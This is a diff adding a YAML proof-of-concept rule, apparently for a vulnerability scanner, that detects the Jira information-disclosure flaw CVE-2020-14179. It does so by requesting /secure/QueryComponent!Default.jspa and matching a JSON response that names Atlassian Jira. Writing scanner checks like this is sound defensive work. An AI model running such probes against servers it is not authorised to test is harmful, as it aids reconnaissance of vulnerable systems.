@@ -1,0 +1,17 @@
+detail:
+  author: harris2015(https://github.com/harris2015)
+  links:
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-14179
+expression: r0()
+manual: true
+name: poc-yaml-jira-cve-2020-14179
+rules:
+  r0:
+    expression: response.status == 200 && response.content_type.contains("json") &&
+      response.body.bcontains(b"com.atlassian.jira")
+    request:
+      cache: true
+      follow_redirects: false
+      method: GET
+      path: /secure/QueryComponent!Default.jspa
+transport: http
